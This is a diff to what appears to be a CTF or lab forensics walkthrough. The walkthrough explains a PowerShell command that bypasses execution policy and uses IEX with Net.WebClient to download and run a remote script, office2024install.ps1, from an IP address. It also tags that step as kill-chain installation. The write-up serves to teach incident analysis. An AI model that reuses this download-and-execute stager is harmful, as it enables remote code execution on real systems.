@@ -59,10 +59,11 @@ The biggest red flag is `-Exec Bypass`, this flag used to override the system's 
 
 `-Command` flag is used to specify the powershell command, `IEX` (Invoke Expression) this cmdlet is used to evaluate or runs the expression passed to it. `(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')` this part creates a new web client object to download the script from the remote server and this script content is passed to IEX which runs it in the current powershell session.
 
-In short, this powershell command is used to download a malicious powersell script file --> `office2024install.ps1`.
+In short, this powershell command is used to download a malicious powersell script file --> `office2024install.ps1`. 
 
 
-11. Great! Simple as that now we identified the full command that was run to download and execute the stager.
+11. Anyway if we correlate this with cyber kill chain stages, this stage is at the **installation** stage --> stage where the attacker tried to gain persistence.
+12. Great! Simple as that now we identified the full command that was run to download and execute the stager.
 
 
 > 2ND QUESTION --> ANS:
